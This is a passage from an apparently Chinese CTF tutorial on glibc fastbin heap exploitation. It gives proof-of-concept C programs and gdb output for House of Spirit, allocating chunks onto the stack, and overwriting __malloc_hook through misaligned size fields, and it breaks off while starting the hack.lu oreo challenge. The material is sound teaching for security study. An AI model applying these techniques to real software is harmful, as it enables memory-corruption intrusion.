0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x601080 &lt;bss_chunk&gt;:   0x0000000000000000  0x0000000000000021
0x601090 &lt;bss_chunk+16&gt;:0x0000000000000000  0x0000000000000000
0x6010a0:               0x0000000000000000  0x0000000000000000
0x6010b0:               0x0000000000000000  0x0000000000000000
0x6010c0:               0x0000000000000000  0x0000000000000000
</code></pre></div> 值得注意的是，我们在 main 函数的第一步就进行了<code>bss_chunk.size=0x21;</code>的操作，这是因为_int_malloc会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。 <div class=highlight><pre><span></span><code>*** Error in `./tst&#39;: malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
</code></pre></div> _int_malloc 中的校验如下 <div class=highlight><pre><span></span><code>if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
      errstr = &quot;malloc(): memory corruption (fast)&quot;;
    errout:
      malloc_printerr (check_action, errstr, chunk2mem (victim));
      return NULL;
}
</code></pre></div></p> <h3 id=_5>小总结<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果( 首先要通过验证 )，这就相当于任意地址写任意值的效果。</p> <h2 id=house-of-spirit>House Of Spirit<a class=headerlink href=#house-of-spirit title="Permanent link">&para;</a></h2> <h3 id=_6>介绍<a class=headerlink href=#_6 title="Permanent link">&para;</a></h3> <p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p> <p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p> <p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p> <ul> <li>fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li> <li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li> <li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li> <li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li> <li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li> </ul> <p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p> <h3 id=_7>演示<a class=headerlink href=#_7 title="Permanent link">&para;</a></h3> <p>这里就直接以 how2heap 上的例子进行说明，如下</p> <div class=highlight><pre><span></span><code><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdlib.h&gt;</span>

<span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>()</span>
<span class=p>{</span>
<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;This file demonstrates the house of spirit attack.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Calling malloc() once so that it sets up its memory.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=o>*</span><span class=n>a</span><span class=p>;</span>
<span class=w>    </span><span class=c1>// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=w> </span><span class=n>__attribute__</span><span class=w> </span><span class=p>((</span><span class=n>aligned</span><span class=w> </span><span class=p>(</span><span class=mi>16</span><span class=p>)));</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>fake_chunks</span><span class=p>),</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>7</span><span class=p>]);</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x40</span><span class=p>;</span><span class=w> </span><span class=c1>// this is the size</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=c1>// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
<span class=w>    </span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x1234</span><span class=p>;</span><span class=w> </span><span class=c1>// nextsize</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>a</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Freeing the overwritten pointer.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;malloc(0x30): %p</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x30</span><span class=p>));</span>
<span class=p>}</span>
</code></pre></div> <p>运行后的效果如下</p> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>how2heap<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>./house_of_spirit
This<span class=w> </span>file<span class=w> </span>demonstrates<span class=w> </span>the<span class=w> </span>house<span class=w> </span>of<span class=w> </span>spirit<span class=w> </span>attack.
Calling<span class=w> </span>malloc<span class=o>()</span><span class=w> </span>once<span class=w> </span>so<span class=w> </span>that<span class=w> </span>it<span class=w> </span>sets<span class=w> </span>up<span class=w> </span>its<span class=w> </span>memory.
We<span class=w> </span>will<span class=w> </span>now<span class=w> </span>overwrite<span class=w> </span>a<span class=w> </span>pointer<span class=w> </span>to<span class=w> </span>point<span class=w> </span>to<span class=w> </span>a<span class=w> </span>fake<span class=w> </span><span class=s1>&#39;fastbin&#39;</span><span class=w> </span>region.
This<span class=w> </span>region<span class=w> </span><span class=o>(</span>memory<span class=w> </span>of<span class=w> </span>length:<span class=w> </span><span class=m>80</span><span class=o>)</span><span class=w> </span>contains<span class=w> </span>two<span class=w> </span>chunks.<span class=w> </span>The<span class=w> </span>first<span class=w> </span>starts<span class=w> </span>at<span class=w> </span>0x7ffd9bceaa58<span class=w> </span>and<span class=w> </span>the<span class=w> </span>second<span class=w> </span>at<span class=w> </span>0x7ffd9bceaa88.
This<span class=w> </span>chunk.size<span class=w> </span>of<span class=w> </span>this<span class=w> </span>region<span class=w> </span>has<span class=w> </span>to<span class=w> </span>be<span class=w> </span><span class=m>16</span><span class=w> </span>more<span class=w> </span>than<span class=w> </span>the<span class=w> </span>region<span class=w> </span><span class=o>(</span>to<span class=w> </span>accomodate<span class=w> </span>the<span class=w> </span>chunk<span class=w> </span>data<span class=o>)</span><span class=w> </span><span class=k>while</span><span class=w> </span>still<span class=w> </span>falling<span class=w> </span>into<span class=w> </span>the<span class=w> </span>fastbin<span class=w> </span>category<span class=w> </span><span class=o>(</span>&lt;<span class=o>=</span><span class=w> </span><span class=m>128</span><span class=w> </span>on<span class=w> </span>x64<span class=o>)</span>.<span class=w> </span>The<span class=w> </span>PREV_INUSE<span class=w> </span><span class=o>(</span>lsb<span class=o>)</span><span class=w> </span>bit<span class=w> </span>is<span class=w> </span>ignored<span class=w> </span>by<span class=w> </span>free<span class=w> </span><span class=k>for</span><span class=w> </span>fastbin-sized<span class=w> </span>chunks,<span class=w> </span>however<span class=w> </span>the<span class=w> </span>IS_MMAPPED<span class=w> </span><span class=o>(</span>second<span class=w> </span>lsb<span class=o>)</span><span class=w> </span>and<span class=w> </span>NON_MAIN_ARENA<span class=w> </span><span class=o>(</span>third<span class=w> </span>lsb<span class=o>)</span><span class=w> </span>bits<span class=w> </span>cause<span class=w> </span>problems.
...<span class=w> </span>note<span class=w> </span>that<span class=w> </span>this<span class=w> </span>has<span class=w> </span>to<span class=w> </span>be<span class=w> </span>the<span class=w> </span>size<span class=w> </span>of<span class=w> </span>the<span class=w> </span>next<span class=w> </span>malloc<span class=w> </span>request<span class=w> </span>rounded<span class=w> </span>to<span class=w> </span>the<span class=w> </span>internal<span class=w> </span>size<span class=w> </span>used<span class=w> </span>by<span class=w> </span>the<span class=w> </span>malloc<span class=w> </span>implementation.<span class=w> </span>E.g.<span class=w> </span>on<span class=w> </span>x64,<span class=w> </span>0x30-0x38<span class=w> </span>will<span class=w> </span>all<span class=w> </span>be<span class=w> </span>rounded<span class=w> </span>to<span class=w> </span>0x40,<span class=w> </span>so<span class=w> </span>they<span class=w> </span>would<span class=w> </span>work<span class=w> </span><span class=k>for</span><span class=w> </span>the<span class=w> </span>malloc<span class=w> </span>parameter<span class=w> </span>at<span class=w> </span>the<span class=w> </span>end.
The<span class=w> </span>chunk.size<span class=w> </span>of<span class=w> </span>the<span class=w> </span>*next*<span class=w> </span>fake<span class=w> </span>region<span class=w> </span>has<span class=w> </span>to<span class=w> </span>be<span class=w> </span>sane.<span class=w> </span>That<span class=w> </span>is<span class=w> </span>&gt;<span class=w> </span><span class=m>2</span>*SIZE_SZ<span class=w> </span><span class=o>(</span>&gt;<span class=w> </span><span class=m>16</span><span class=w> </span>on<span class=w> </span>x64<span class=o>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>&lt;<span class=w> </span>av-&gt;system_mem<span class=w> </span><span class=o>(</span>&lt;<span class=w> </span>128kb<span class=w> </span>by<span class=w> </span>default<span class=w> </span><span class=k>for</span><span class=w> </span>the<span class=w> </span>main<span class=w> </span>arena<span class=o>)</span><span class=w> </span>to<span class=w> </span>pass<span class=w> </span>the<span class=w> </span>nextsize<span class=w> </span>integrity<span class=w> </span>checks.<span class=w> </span>No<span class=w> </span>need<span class=w> </span><span class=k>for</span><span class=w> </span>fastbin<span class=w> </span>size.
Now<span class=w> </span>we<span class=w> </span>will<span class=w> </span>overwrite<span class=w> </span>our<span class=w> </span>pointer<span class=w> </span>with<span class=w> </span>the<span class=w> </span>address<span class=w> </span>of<span class=w> </span>the<span class=w> </span>fake<span class=w> </span>region<span class=w> </span>inside<span class=w> </span>the<span class=w> </span>fake<span class=w> </span>first<span class=w> </span>chunk,<span class=w> </span>0x7ffd9bceaa58.
...<span class=w> </span>note<span class=w> </span>that<span class=w> </span>the<span class=w> </span>memory<span class=w> </span>address<span class=w> </span>of<span class=w> </span>the<span class=w> </span>*region*<span class=w> </span>associated<span class=w> </span>with<span class=w> </span>this<span class=w> </span>chunk<span class=w> </span>must<span class=w> </span>be<span class=w> </span><span class=m>16</span>-byte<span class=w> </span>aligned.
Freeing<span class=w> </span>the<span class=w> </span>overwritten<span class=w> </span>pointer.
Now<span class=w> </span>the<span class=w> </span>next<span class=w> </span>malloc<span class=w> </span>will<span class=w> </span><span class=k>return</span><span class=w> </span>the<span class=w> </span>region<span class=w> </span>of<span class=w> </span>our<span class=w> </span>fake<span class=w> </span>chunk<span class=w> </span>at<span class=w> </span>0x7ffd9bceaa58,<span class=w> </span>which<span class=w> </span>will<span class=w> </span>be<span class=w> </span>0x7ffd9bceaa60!
malloc<span class=o>(</span>0x30<span class=o>)</span>:<span class=w> </span>0x7ffd9bceaa60
</code></pre></div> <h3 id=_8>小总结<a class=headerlink href=#_8 title="Permanent link">&para;</a></h3> <p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p> <h2 id=alloc-to-stack>Alloc to Stack<a class=headerlink href=#alloc-to-stack title="Permanent link">&para;</a></h2> <h3 id=_9>介绍<a class=headerlink href=#_9 title="Permanent link">&para;</a></h3> <p>如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</p> <p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p> <h3 id=_10>演示<a class=headerlink href=#_10 title="Permanent link">&para;</a></h3> <p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。 <div class=highlight><pre><span></span><code>typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&amp;stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
</code></pre></div> 通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk <div class=highlight><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
0x602010:   0x00007fffffffde60  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk
</code></pre></div> 之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行 <div class=highlight><pre><span></span><code>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin
0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]
0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000
</code></pre></div> 最终第二次malloc返回值为0x00007fffffffde70也就是stack_chunk <div class=highlight><pre><span></span><code>   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;
 → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70

0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
</code></pre></div></p> <h3 id=_11>小总结<a class=headerlink href=#_11 title="Permanent link">&para;</a></h3> <p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。</p> <h2 id=arbitrary-alloc>Arbitrary Alloc<a class=headerlink href=#arbitrary-alloc title="Permanent link">&para;</a></h2> <h3 id=_12>介绍<a class=headerlink href=#_12 title="Permanent link">&para;</a></h3> <p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如bss、heap、data、stack等等。</p> <h3 id=_13>演示<a class=headerlink href=#_13 title="Permanent link">&para;</a></h3> <p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到<strong>_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。</strong> <div class=highlight><pre><span></span><code>int main(void)
{


    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
</code></pre></div> 这里的0x7ffff7dd1af5是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。 <div class=highlight><pre><span></span><code>0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
</code></pre></div> 0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是 64 位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下： <div class=highlight><pre><span></span><code>//这里的size指用户区域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
</code></pre></div> 通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f <div class=highlight><pre><span></span><code>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0

0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f
</code></pre></div> 因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p> <p><div class=highlight><pre><span></span><code><span class=cp>##define fastbin_index(sz)                                                      \</span>
<span class=cp>    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span>
</code></pre></div> （注意sz的大小是unsigned int，因此只占4个字节）</p> <p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook的内容(在我的libc中__realloc_hook与__malloc_hook是在连在一起的)。</p> <div class=highlight><pre><span></span><code>0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;
 →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x7ffff7dd1afd

0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f
0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f
0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000
0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000
</code></pre></div> <h3 id=_14>小总结<a class=headerlink href=#_14 title="Permanent link">&para;</a></h3> <p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p> <h2 id=2014-hacklu-oreo>2014 hack.lu oreo<a class=headerlink href=#2014-hacklu-oreo title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo>题目链接</a></p> <h3 id=_15>基本分析<a class=headerlink href=#_15 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2014_Hack.lu_oreo<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>file<span class=w> </span>oreo
oreo:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bit<span class=w> </span>LSB<span class=w> </span>executable,<span class=w> </span>Intel<span class=w> </span><span class=m>80386</span>,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked,<span class=w> </span>interpreter<span class=w> </span>/lib/ld-linux.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>2</span>.6.26,<span class=w> </span>BuildID<span class=o>[</span>sha1<span class=o>]=</span>f591eececd05c63140b9d658578aea6c24450f8b,<span class=w> </span>stripped
➜<span class=w>  </span>2014_Hack.lu_oreo<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>checksec<span class=w> </span>oreo
